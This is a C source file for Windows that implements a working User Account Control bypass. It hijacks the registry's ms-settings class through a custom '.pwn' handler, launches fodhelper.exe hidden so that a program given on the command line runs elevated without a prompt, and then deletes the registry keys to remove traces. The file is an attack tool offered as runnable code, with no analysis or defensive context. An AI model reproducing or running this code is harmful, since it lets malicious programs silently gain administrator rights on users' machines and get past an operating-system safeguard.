#include <windows.h>
#include <stdio.h>
#include <tchar.h>



char exeFilePath[MAX_PATH*4] = {0};

/////////////////////////////
void ANSItoUnicode(char* strA,wchar_t* strW, int size_strW);
bool CreateRegParams(wchar_t* filePath);
bool DeleteRegParams();

int main(int argc, char* argv[])
{
	//WCHAR Title[MAX_PATH];
	//GetConsoleTitleW(Title, MAX_PATH);
	//HWND hWnd = FindWindowW(NULL, Title);
	//if (hWnd)
	//SetWindowPos(hWnd, 0, 0, 0, 0, 0, SWP_HIDEWINDOW);

	if (argc == 2)
	{
		wsprintf(exeFilePath, "%s", argv[1]);
	}
	else 
	{
		//MessageBox(NULL, "OOps", "OOps", MB_OK);
		ExitProcess(1);
	}

	wchar_t exeFilePathW[MAX_PATH*4] = {0};
	ANSItoUnicode(exeFilePath, exeFilePathW, 1040);

	if (CreateRegParams(exeFilePathW))
	{
		Sleep(1000);

		ShellExecuteW(NULL, NULL, L"C:\\Windows\\System32\\fodhelper.exe", NULL, NULL, SW_HIDE);

		Sleep(2000);
		DeleteRegParams();
	}
	else 
		ExitProcess(1);

	return 0;
}



bool CreateRegParams(wchar_t* filePath)
{
	HKEY hkey;
	DWORD res;
	DWORD dwType = NULL;
	bool Res = FALSE;
	wchar_t* pwn = L".pwn";

	if((res = RegCreateKeyEx(HKEY_CURRENT_USER,  _T("Software\\Classes\\.pwn\\Shell\\Open\\command"), 0, NULL, 0, 0, NULL, &hkey, &dwType)) == ERROR_SUCCESS)
	{
		res = RegOpenKeyEx(HKEY_CURRENT_USER, _T("Software\\Classes\\.pwn\\Shell\\Open\\command"), 0, KEY_ALL_ACCESS, &hkey);
		if ( res == ERROR_SUCCESS )
		{
			RegSetValueExW( hkey, L"", 0, REG_SZ, (BYTE*)filePath, lstrlenW(filePath)*sizeof(WCHAR));
			//RegSetValueExW( hkey, L"DelegateExecute", 0, REG_SZ, (BYTE*)empty, lstrlenW(empty)*sizeof(WCHAR));
			Res = TRUE;
		}
		else 
			Res = FALSE;
	}
	else 
		Res = FALSE;


	if((res = RegCreateKeyEx(HKEY_CURRENT_USER,  _T("Software\\Classes\\ms-settings\\CurVer"), 0, NULL, 0, 0, NULL, &hkey, &dwType)) == ERROR_SUCCESS)
	{
		res = RegOpenKeyEx(HKEY_CURRENT_USER, _T("Software\\Classes\\ms-settings\\CurVer"), 0, KEY_ALL_ACCESS, &hkey);
		if ( res == ERROR_SUCCESS )
		{
			RegSetValueExW( hkey, L"", 0, REG_SZ, (BYTE*)pwn, lstrlenW(pwn)*sizeof(WCHAR));
			//RegSetValueExW( hkey, L"DelegateExecute", 0, REG_SZ, (BYTE*)empty, lstrlenW(empty)*sizeof(WCHAR));
			Res = TRUE;
		}
		else 
			Res = FALSE;
	}
	else 
		Res = FALSE;

	RegCloseKey(hkey);
	return Res;
}

bool DeleteRegParams()
{
	HKEY hkey;
	DWORD res;
	DWORD dwType = NULL;
	bool Res = FALSE;

	if(res = RegOpenKeyEx(HKEY_CURRENT_USER, _T("Software\\Classes\\.pwn\\Shell\\Open"), 0, KEY_ALL_ACCESS, &hkey) == ERROR_SUCCESS)
	{
		if (RegDeleteKey(hkey, _T("command")) == ERROR_SUCCESS)
			Res = TRUE;
		else 
			Res = FALSE;
	}
	else 
		Res = FALSE;
	RegCloseKey(hkey);

	if(res = RegOpenKeyEx(HKEY_CURRENT_USER, _T("Software\\Classes\\.pwn\\Shell"), 0, KEY_ALL_ACCESS, &hkey) == ERROR_SUCCESS)
	{
		if (RegDeleteKey(hkey, _T("Open")) == ERROR_SUCCESS)
			Res = TRUE;
		else 
			Res = FALSE;
	}
	else 
		Res = FALSE;
	RegCloseKey(hkey);

	if(res = RegOpenKeyEx(HKEY_CURRENT_USER, _T("Software\\Classes\\.pwn"), 0, KEY_ALL_ACCESS, &hkey) == ERROR_SUCCESS)
	{
		if (RegDeleteKey(hkey, _T("Shell")) == ERROR_SUCCESS)
			Res = TRUE;
		else 
			Res = FALSE;
	}
	else 
		Res = FALSE;
	RegCloseKey(hkey);

	if(res = RegOpenKeyEx(HKEY_CURRENT_USER, _T("Software\\Classes"), 0, KEY_ALL_ACCESS, &hkey) == ERROR_SUCCESS)
	{
		if (RegDeleteKey(hkey, _T(".pwn")) == ERROR_SUCCESS)
			Res = TRUE;
		else 
			Res = FALSE;
	}
	else 
		Res = FALSE;
	RegCloseKey(hkey);

	//////////////////
	if(res = RegOpenKeyEx(HKEY_CURRENT_USER, _T("Software\\Classes\\ms-settings"), 0, KEY_ALL_ACCESS, &hkey) == ERROR_SUCCESS)
	{
		if (RegDeleteKey(hkey, _T("CurVer")) == ERROR_SUCCESS)
			Res = TRUE;
		else 
			Res = FALSE;
	}
	else 
		Res = FALSE;
	RegCloseKey(hkey);

	if(res = RegOpenKeyEx(HKEY_CURRENT_USER, _T("Software\\Classes"), 0, KEY_ALL_ACCESS, &hkey) == ERROR_SUCCESS)
	{
		if (RegDeleteKey(hkey, _T("ms-settings")) == ERROR_SUCCESS)
			Res = TRUE;
		else 
			Res = FALSE;
	}
	else 
		Res = FALSE;
	RegCloseKey(hkey);

	return Res;
}

///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////


void ANSItoUnicode(char* strA,wchar_t* strW, int size_strW ) 
{
	memset(strW,'\0', size_strW*sizeof(WCHAR));
	int res_len = MultiByteToWideChar(CP_ACP, 0, strA, -1, NULL, 0);
	MultiByteToWideChar(CP_ACP, 0, strA, -1, strW, res_len*2);
}


